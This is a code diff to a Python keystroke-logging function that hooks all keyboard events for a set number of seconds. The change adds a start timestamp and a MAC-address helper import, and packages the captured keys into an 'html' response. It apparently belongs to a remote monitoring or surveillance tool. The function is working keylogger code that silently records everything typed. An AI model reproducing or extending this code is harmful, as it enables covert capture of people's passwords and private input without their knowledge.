@@ -3,6 +3,7 @@ import keyboard
 from keyboard import KeyboardEvent
 import time
 import threading
+from .mac import get_mac
 
 spec_key = {
     key: f'⌠{key}⌡'
@@ -37,6 +38,8 @@ def parse_key_event(event: KeyboardEvent):
 def get_key_log(duration = 5):
     logger = []
     
+    _time = datetime.datetime.now()
+    
     keyboard.hook(
         lambda event: logger.append(parse_key_event(event))
     )
@@ -44,4 +47,11 @@ def get_key_log(duration = 5):
     time.sleep(duration)
     keyboard.unhook_all()
 
-    return ''.join(logger)
+    content = f'{duration} (s) of key logging (from: {_time}): ' + ''.join(logger)
+    
+    response = {
+        'html': content,
+        'data': None
+    }
+    
+    return response
